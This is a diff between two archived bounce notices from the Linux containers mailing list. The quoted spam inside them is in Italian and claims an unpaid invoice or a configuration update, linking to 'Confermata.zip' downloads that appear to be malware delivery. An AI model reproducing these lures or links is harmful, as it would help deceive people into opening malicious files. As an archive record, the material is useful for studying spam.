@@ -1,9 +1,10 @@
-From: postmaster-ORiaYrpEo8U@public.gmane.org
-Subject: Delivery Status Notification (Failure)
-Date: Tue, 21 Feb 2012 02:37:05 +0000
-Message-ID: <ROK2tllPp0001d16a@hesl01uker.he.local>
+From: Mail Delivery System <Mailer-Daemon-nIBObKlswexWv30nIVyW2w@public.gmane.org>
+Subject: Mail delivery failed: returning message to sender
+Date: Mon, 20 Feb 2012 23:57:53 -0600
+Message-ID: <E1RzijZ-00087U-DN@server.ar8ar.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============6533195684246103345=="
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,90 +18,56 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-formatted message.  
-Portions of this message may be unreadable without a MIME-capable mail program.
+This message was created automatically by mail delivery software.
 
---===============6533195684246103345==
-Content-Type: multipart/report; report-type=delivery-status;
-	boundary="9B095B5ADSN=_01CCE687B30DAB9100025274hesl01uker.he.lo"
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-This is a MIME-formatted message.  
-Portions of this message may be unreadable without a MIME-capable mail program.
+  jer-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jer-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    host mail.mariotti.it [195.88.6.180]: 550 5.1.1 <jer-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    Recipient address rejected: User unknown in virtual mailbox table
+  jasmine-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jasmine-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    host mail.mariotti.it [195.88.6.180]: 550 5.1.1 <jasmine-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    Recipient address rejected: User unknown in virtual mailbox table
+  jakai-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jakai-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    host mail.mariotti.it [195.88.6.180]: 550 5.1.1 <jakai-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    Recipient address rejected: User unknown in virtual mailbox table
+  jac-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jac-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    host mail.mariotti.it [195.88.6.180]: 550 5.1.1 <jac-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    Recipient address rejected: User unknown in virtual mailbox table
+  infonn-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<infonn-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    host mail.mariotti.it [195.88.6.180]: 550 5.1.1 <infonn-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>:
+    Recipient address rejected: User unknown in virtual mailbox table
 
---9B095B5ADSN=_01CCE687B30DAB9100025274hesl01uker.he.lo
-Content-Type: text/plain; charset=unicode-1-1-utf-7
+------ This is a copy of the message, including all the headers. ------
 
-This is an automatically generated Delivery Status Notification.
-
-Delivery to the following recipients failed.
-
-       une.triuggio.mi.itnorahtpentowsnq-uGzjIMqvpCMqRzXS/x11ag@public.gmane.org
-
-
-
-
---9B095B5ADSN=_01CCE687B30DAB9100025274hesl01uker.he.lo
-Content-Type: message/delivery-status
-
-Reporting-MTA: dns;hesl01uker.he.local
-Received-From-MTA: dns;ibmr.btconnect.com
-Arrival-Date: Tue, 21 Feb 2012 02:37:05 +0000
-
-Final-Recipient: rfc822;une.triuggio.mi.itnorahtpentowsnq-uGzjIMqvpCMqRzXS/x11ag@public.gmane.org
-Action: failed
-Status: 5.1.1
-
---9B095B5ADSN=_01CCE687B30DAB9100025274hesl01uker.he.lo
-Content-Type: message/rfc822
-
-Received: from ibmr.btconnect.com ([213.123.20.74]) by hesl01uker.he.local with Microsoft SMTPSVC(6.0.3790.4675);
-	 Tue, 21 Feb 2012 02:37:05 +0000
-Received: from cpanel50.swiftco.net (EHLO cpanel50.swiftco.net) ([216.18.227.242])
-	by c2bthimr03.btconnect.com
-	with ESMTP id LGD62749;
-	Tue, 21 Feb 2012 02:37:05 +0000 (GMT)
-Received: from [216.18.227.242] by cpanel50.swiftco.net id Qv5DHusi; Mon, 20 Feb 2012 18:37:03 -0800
-Message-ID: <004701ccf041$afceae00$01000a0a-UqesdKZYNawCNHY3F7U79eTW4wlIGRCZ@public.gmane.org>
-From: "Supportpay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <une.triuggio.mi.itnorahtpentowsnq-uGzjIMqvpCMqRzXS/x11ag@public.gmane.org>
-Subject: Il vostro ordine di riferimento e 130288
-Date: Mon, 20 Feb 2012 18:37:03 -0800
+Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from [208.89.210.204] (helo=vps.datacenterbolivia.com)
+	by server.ar8ar.com with esmtpa (Exim 4.69)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1RzijX-00086z-65; Mon, 20 Feb 2012 23:57:51 -0600
+Received: from [208.89.210.204] by vps.datacenterbolivia.com id TJmqeI5aFyxNYvy; Mon, 20 Feb 2012 22:58:01 -0700
+Message-ID: <006901ccf05d$c2ef7700$14000a0a-J7+7M2dRO4ACJ8ddfNFNZ6CD0JFbOjFwAL8bYrjMMd8@public.gmane.org>
+From: "billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <infonn-21hpygcPitQ1GQ1Ptb7lUw@public.gmane.org>
+Subject: Il vostro ordine di riferimento e 780717
+Date: Mon, 20 Feb 2012 22:58:01 -0700
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-X-Mirapoint-IP-Reputation: reputation=Fair-1,
-	source=Queried,
-	refid=tid=0001.0A0B0303.4F43034F.0058,
-	actions=tag
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-OriginalArrivalTime: 21 Feb 2012 02:37:05.0065 (UTC) FILETIME=[B2D38990:01CCF041]
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
 
 
 
-Gentile utente,=20
+Gentile utente, Monte Biz 
+      
 
+Si prega di notare che hai una fattura non pagata.
 
-L'aggiornamento di configurazione
-http://www.affile.org/adviser/Confermata.zip?784658998
-
-
-=3D=3D
-rzY9tQ
-
-
-
-
---9B095B5ADSN=_01CCE687B30DAB9100025274hesl01uker.he.lo--
-
---===============6533195684246103345==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Containers mailing list
-Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============6533195684246103345==--
+Dettagli
+http://www.modsart.in/info/Confermata.zip?2840713
